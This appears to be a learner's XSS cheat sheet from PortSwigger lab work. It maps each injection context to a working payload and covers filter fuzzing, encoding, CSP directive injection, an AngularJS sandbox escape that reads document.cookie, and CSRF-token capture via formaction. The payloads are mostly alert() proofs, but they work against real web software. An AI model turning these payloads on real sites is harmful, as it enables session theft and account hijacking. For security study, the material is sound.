# XSS Cheat Sheet

## The method (ask this every time)

1. Type a random word like `zzzzzz123` into the input
2. Right-click near where it shows up, click Inspect
3. Find your word in the code, look at what's immediately around it, that's
   the "house" it's sitting in
4. Match the house to the trick below

## Houses and tricks

### House: plain in the page, nothing special around it

Your word just shows up as normal text on the page.

```html
<p>You searched for: zzzzzz123</p>
```

Trick: just inject a script tag directly, nothing to escape first

```
<script>alert(1)</script>
```

### House: inside a quoted HTML attribute

Your word is sitting inside `"..."` as part of some tag's attribute.

```html
<img src="zzzzzz123">
```

Trick: close the quote and the tag, then start a fresh element

```
"><svg onload=alert(1)>
```

### House: inside a quoted attribute, but angle brackets are blocked

Same as above, but `<` and `>` get encoded if you try to use them.

```html
<input value="zzzzzz123">
```

Trick: stay inside the attribute, close it with a quote, then open a brand new
attribute with its own event handler, no angle brackets needed

```
"onmouseover="alert(1)
```

### House: inside a box element like select or option

Your word is one of the options in a dropdown.

```html
<select><option>zzzzzz123</option></select>
```

Trick: close the whole box first, then start a new, independent element after it

```
"></select><img src=1 onerror=alert(1)>
```

### House: inside a JavaScript string

Your word is sitting inside quotes, but inside a `<script>` block, not plain HTML.

```html
<script>var searchTerm = 'zzzzzz123';</script>
```

Trick: close the JavaScript string with a quote, run your own statement, then
patch the rest of the line so it doesn't break

```
'-alert(1)-'
```

### House: an href link (anchor tag)

Your word becomes part of a link's destination.

```html
<a href="zzzzzz123">click here</a>
```

Trick: replace the whole value with a javascript: URL, no need to break out of
anything, it runs when the link is clicked

```
javascript:alert(1)
```

### House: a page using double curly braces anywhere, {{ }}

This usually means a framework like AngularJS is reading that text as code, not
plain text, even with no HTML tags involved.

```html
<div ng-app>zzzzzz123</div>
```

Trick: speak the framework's own expression syntax instead of HTML

```
{{$on.constructor('alert(1)')()}}
```

## Notes

- Always do step 1 (random word) and step 2 (inspect it) first. Never guess a
  payload before seeing the actual house
- Houses above are only the ones tested so far, in these PortSwigger labs. New
  houses get added here as they come up
- Tested by me: all houses above, each one in its matching lab

## Finding what a filter blocks (Burp Intruder method)

1. Confirm an obvious payload gets blocked (usually a 400 response)
2. Send the request to Intruder, replace input with `<>`, mark a payload
   position between the brackets
3. Paste PortSwigger's tag list (from their own XSS cheat sheet) as payloads,
   run the attack, look for 200s among the 400s
4. Repeat with the event list once a working tag is found

### House: a filter blocks common tags (img, svg alone, body)

Trick: try an unrecognized, made-up tag name, the browser still renders it
as an element with working attributes, even though it means nothing to HTML
itself. Needs a focus trigger since there's no load/error event to use.

```
<xss id=x onfocus=alert(1) tabindex=1>#x
```

The #x at the end matches id=x, which auto-focuses the element on page load.

### House: a filter blocks common tags but SVG animation tags survive

```
<svg><animatetransform onbegin=alert(1)>
```

animatetransform (and others like animate, set) only work inside an <svg>
wrapper, and carry their own events (onbegin, onend, onrepeat) tied to the
animation's lifecycle, fires automatically when the animation starts.

### House: reflected inside a link tag's href, single quotes

```
'accesskey='x'onclick='alert(1)
```

accesskey assigns a keyboard shortcut to any element. onclick fires when
that shortcut is pressed, not just from a real mouse click.

## Deciding: direct URL, or exploit server?

- Fires immediately when the page with the input loads, no second step
  needed → visit the crafted URL directly
- Needs something to happen after the page has already loaded (a hash
  changing, a resize, a stored comment viewed by someone else) → needs the
  exploit server, to build a page that causes that second step
- Edge case: a lab's simulated victim performing an action (like a key
  press) counts as handled automatically, direct URL can still work even
  though a "second step" is technically involved

## URL encoding (different from HTML entities)

Used when a payload travels inside a URL itself, such as a query parameter
or inside an iframe's src attribute on the exploit server. A browser cannot
safely carry certain raw characters inside a URL, so they get represented as
% followed by two hex digits. This is a different system from HTML entities,
URL encoding is decoded by the browser when it reads the URL, HTML entities
are decoded when the browser renders HTML. Don't mix them up: a payload sent
as a URL parameter needs URL encoding, a payload reflected into an HTML
attribute needs an HTML entity, if either is needed at all.

| Character | URL encoded |
|---|---|
| space | `%20` or `+` |
| `"` | `%22` |
| `'` | `%27` |
| `<` | `%3C` |
| `>` | `%3E` |
| `=` | `%3D` |
| `#` | `%23` |
| `&` | `%26` |
| `/` | `%2F` |
| `:` | `%3A` |

Example, decoding a full payload seen in a lab:

```
%22%3E%3Cbody%20onresize=print()%3E
```

decodes to:

```
"><body onresize=print()>
```

## HTML entities (bypassing filters that check for raw characters)

A filter that escapes or blocks a raw character often does not recognize
that character written as an HTML entity instead. The browser decodes the
entity into the real character only when rendering the page, after the
filter has already run.

| Entity | Real character |
|---|---|
| `&apos;` | `'` |
| `&quot;` | `"` |
| `&lt;` | `<` |
| `&gt;` | `>` |
| `&amp;` | `&` |

URL encoding (above) is for characters traveling inside a URL. HTML entities
(this section) are for characters that need to survive a page-content filter
and get decoded when the browser renders the HTML. Check which one a payload
actually needs based on where it's landing, a URL parameter or HTML content.

### House: single quotes are escaped, HTML entities are not filtered

```
http://foo?&apos;-alert(1)-&apos;
```

### House: both quote and backslash are escaped

Trick: break out of the whole script block instead of just the string

```
</script><script>alert(1)</script>
```

### House: inside a template literal (backtick string)

Trick: stay inside it, use its own expression syntax, no escaping needed if
${ } itself isn't blocked

```
${alert(1)}
```

## CSP (Content Security Policy) concepts

CSP is a response header the server sends, telling the browser which sources
of scripts, styles, and other resources are allowed to run on the page. It
blocks injected inline scripts and event handlers even when the injection
itself succeeds. CSP is not one rule, it is a list of separate rules called
directives, each one controlling a different kind of resource.

### Directive duplication rule

If a CSP header contains the same directive type more than once, the browser
only enforces the first one it sees and ignores every later duplicate. This
matters when an injection point lets an attacker add a brand new directive of
a type the original policy never had, since the injected one then counts as
the only, and therefore the first, occurrence, and wins.

### Policy injection through an unsanitised reflected parameter

Some pages build their CSP header dynamically, inserting a value the user
controls (such as a reporting token) directly into it with no sanitising. A
semicolon in CSP syntax ends the current directive and starts a new one, so
putting a semicolon at the start of that controlled value lets an attacker
close the original directive early and inject a completely new one, such as
script-src-elem 'unsafe-inline', which specifically allows inline script
elements to run.

### Missing form-action directive

A CSP policy that never restricts form-action leaves forms completely free
to submit anywhere. This does not allow script execution, but it does allow
hijacking an existing form's destination using plain HTML, see formaction
and formmethod below.

## AngularJS sandbox escape concepts

AngularJS runs its own interpreter for special attributes like ng-focus and
ng-click, evaluating whatever expression is written inside them. A page that
already trusts AngularJS lets these expressions run even under a strict CSP,
because CSP only sees the already-trusted library executing, not a new
script.

The AngularJS sandbox is a second, separate defense layer built into the
library itself. Its job is to stop an expression from directly calling a
function using the real window object as its context.

- $event.composedPath(): returns the full list of elements an event passed
  through, from the triggering element outward. The last item in that list
  is the window object itself, so this reaches window without ever typing
  the word window
- |orderBy:...: normal AngularJS syntax for sorting a list, repurposed here
  to evaluate an expression against every item in a list, including the
  window item from composedPath, in that item's own scope
- (z=alert)(document.cookie): calling alert directly with window as its
  context gets caught by the sandbox's check. Assigning alert to a new name
  first, then calling the result of that assignment, no longer looks like a
  direct call on window, so the sandbox's check does not catch it

## HTML and SVG features that bypass CSP without any script

These use real, built-in browser behaviour, not JavaScript, so CSP has
nothing to block.

- animate's attributeName and values: the animate SVG tag can change another
  element's attribute, such as href, after the page has already loaded and
  after any filter has already checked the original value. The dangerous
  value is never present in the page's original source, only applied live
- formaction: an attribute on a button that overrides where its enclosing
  form submits to, only for that one button, when it is the one clicked.
  This is native HTML behaviour, not a script, so CSP cannot restrict it
  unless the form-action directive specifically does
- formmethod="get": forces a form to submit using GET instead of its normal
  method, only for that one button. GET puts every field's data directly
  into the destination URL, which is how a hidden field like a CSRF token
  can be made visible and capturable

## Browser machinery used to trigger code without calling it directly

These are built-in browser features that normally serve a harmless purpose,
repurposed to run attacker code indirectly where a direct call would be
blocked or not allowed.

- window.onerror: a built-in handler the browser calls automatically
  whenever an unhandled error occurs anywhere on the page. Setting it equal
  to alert means any error from this point on effectively becomes a call to
  alert
- toString override: every JavaScript object has a built-in toString method
  that runs automatically whenever the object needs to become text.
  Overwriting it with a custom function means any attempt to read that
  object as text runs the custom function instead
- window+'': adding an empty string to any value forces JavaScript to
  convert it to text first. If toString has been overwritten, this triggers
  the custom function instead of a normal conversion
- throw needing an arrow function: throw is a statement, not an expression,
  so it cannot be placed directly inside other code. Wrapping it in a small
  arrow function, like x=>{throw ...}, gives it a valid place to exist
- /**/ as a blocked space: an empty comment is invisible to the browser but
  still separates two words, used when a filter blocks the actual space
  character

## JavaScript used to automate an attack (building and submitting a form)

These are the pieces needed to make a page act on its own, without the
victim clicking anything, once the attacker's own script is running on the
attacker's own page.

- const: declares a name for a value and prevents that name from being
  reassigned later. Used to store fixed values, like site URLs, so they
  cannot accidentally change further down the script
- location: holds the full current address of the page. Reading it tells
  the script what URL it is on right now. Setting it to a new string
  immediately redirects the browser there, the same as typing a new address
  into the bar
- new URL(location): converts the raw address text into a structured
  object with separate, readable parts (domain, path, query parameters),
  instead of one long string that would need manual cutting apart
- searchParams: a tool on that structured URL object for reading the key
  and value pairs that appear after the question mark in a URL
- .get('name'): asks searchParams for the value of one specific key. Gives
  back the value if that key exists in the URL, or nothing if it does not,
  which JavaScript treats as false in a condition check
- document.createElement('tag'): builds a brand new HTML element entirely
  in memory. It does not appear anywhere on the actual page until it is
  attached to it
- element.append(child): attaches one element inside another as a child.
  Used to place input fields inside a newly created form
- document.documentElement: the page's own outermost html element.
  Appending something here places it onto the real, visible page, which is
  required before it can be submitted
- form.submit(): submits a form in code, exactly as if a user had clicked
  its submit button, with no click required
- Template literals (backtick strings with ${ } inside): a way to build a
  string that automatically inserts a variable's current value at that
  exact spot, instead of manually joining pieces of text together

## Client-side validation bypass

- type="email" on an input makes the browser itself reject badly formatted
  text before anything is even sent anywhere. Opening DevTools and manually
  changing that attribute to type="text" removes the browser's own check
  completely, since type="text" accepts any input. This changes nothing on
  the server, it only affects what your own browser allows you to type and
  submit
